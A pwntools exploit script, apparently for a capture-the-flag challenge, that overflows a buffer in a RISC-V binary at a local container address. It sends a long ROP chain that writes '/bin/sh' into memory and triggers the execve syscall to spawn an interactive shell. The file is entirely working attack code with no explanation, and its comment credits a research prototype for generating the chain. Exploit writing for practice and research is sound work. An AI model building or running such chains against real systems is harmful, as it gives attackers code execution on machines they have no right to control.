from pwn import *

#r = process(['qemu-riscv64-static', '-g', '1234', './chall.patched'])
#r = process('./chall.patched')
r = remote('172.17.0.3', 9999)

# the following ROP chain is generated by my research prototype :P

chain = b""
chain += p64(0x1cc7e)	# ld ra, 24(sp); ld s0, 16(sp); ld s1, 8(sp); ld s2, 0(sp); addi sp, sp, 32; ret 
chain += p64(0x831dc)
chain += p64(0x68732f6e69622f)
chain += p64(0x0)
chain += p64(0x18e84)	# ld ra, 24(sp); ld s0, 16(sp); sd s1, 16(s2); ld s1, 8(sp); ld s2, 0(sp); addi sp, sp, 32; ret 
chain += p64(0x0)
chain += p64(0x0)
chain += p64(0x0)
chain += p64(0x505be)	# ld s7, 24(sp); ld s8, 16(sp); ld s9, 8(sp); ld ra, 88(sp); ld s0, 80(sp); ld s1, 72(sp); addi sp, sp, 96; ret 
chain += p64(0x0)
chain += p64(0xdd)
chain += p64(0x0)
chain += p64(0x0)
chain += p64(0x0)
chain += p64(0x0)
chain += p64(0x0)
chain += p64(0x0)
chain += p64(0x0)
chain += p64(0x0)
chain += p64(0x0)
chain += p64(0x151be)	# ld ra, 56(sp); ld s0, 48(sp); ld s1, 40(sp); ld s3, 24(sp); ld s4, 16(sp); ld s5, 8(sp); mv a0, s2; ld s2, 32(sp); addi sp, sp, 64; ret 
chain += p64(0x0)
chain += p64(0x1d062)	# ld ra, 8(sp); ld s0, 0(sp); addi sp, sp, 16; ret 
chain += p64(0x0)
chain += p64(0x0)
chain += p64(0x0)
chain += p64(0x0)
chain += p64(0x833a4)
chain += p64(0x200ea)	# mv a2, s6; addi a1, s0, -408; mv a0, s3; jalr s5
chain += p64(0x0)
chain += p64(0x1b06a)	# mv a7, s9; ori a5, a5, 1; ld s1, 40(sp); ld s4, 16(sp); ld s5, 8(sp); sd a5, 8(a1); li a0, 1; j 0x1afe2; ld ra, 56(sp); ld s0, 48(sp); ld s2, 32(sp); ld s3, 24(sp); addi sp, sp, 64; ret 
chain += p64(0x0)
chain += p64(0x0)
chain += p64(0x0)
chain += p64(0x0)
chain += p64(0x0)
chain += p64(0x0)
chain += p64(0x0)
chain += p64(0x151be)	# ld ra, 56(sp); ld s0, 48(sp); ld s1, 40(sp); ld s3, 24(sp); ld s4, 16(sp); ld s5, 8(sp); mv a0, s2; ld s2, 32(sp); addi sp, sp, 64; ret 
chain += p64(0x0)
chain += p64(0x1d062)	# ld ra, 8(sp); ld s0, 0(sp); addi sp, sp, 16; ret 
chain += p64(0x0)
chain += p64(0x0)
chain += p64(0x0)
chain += p64(0x0)
chain += p64(0x198)
chain += p64(0x200ea)	# mv a2, s6; addi a1, s0, -408; mv a0, s3; jalr s5
chain += p64(0x0)
chain += p64(0x2f87c)	# ld ra, 88(sp); ld s0, 80(sp); ld s3, 56(sp); ld s5, 40(sp); ld s7, 24(sp); ld s8, 16(sp); ld s10, 0(sp); addi sp, sp, 96; ret 
chain += p64(0x1d062)	# ld ra, 8(sp); ld s0, 0(sp); addi sp, sp, 16; ret 
chain += p64(0x0)
chain += p64(0x0)
chain += p64(0x0)
chain += p64(0x0)
chain += p64(0x0)
chain += p64(0x0)
chain += p64(0x0)
chain += p64(0x0)
chain += p64(0x0)
chain += p64(0x88)
chain += p64(0x2a1f0)	# addi a2, s0, -136; mv a0, t3; jalr s10
chain += p64(0x0)
chain += p64(0x1cc7e)	# ld ra, 24(sp); ld s0, 16(sp); ld s1, 8(sp); ld s2, 0(sp); addi sp, sp, 32; ret 
chain += p64(0x3a2c8)	# ecall ; ret 
chain += p64(0x831ec)
chain += p64(0x0)
chain += p64(0x3ad88)	# mv a0, s1; ld s0, 32(sp); ld ra, 40(sp); ld s1, 24(sp); ld s3, 8(sp); mv a5, s2; ld s2, 16(sp); addi sp, sp, 48; jr a5
chain += p64(0x0)
chain += p64(0x0)
chain += p64(0x0)
chain += p64(0x0)
chain += p64(0x0)
chain += p64(0x0)

r.sendafter(b'>> ', b'A'*0x10+b'B'*8+chain)

r.interactive()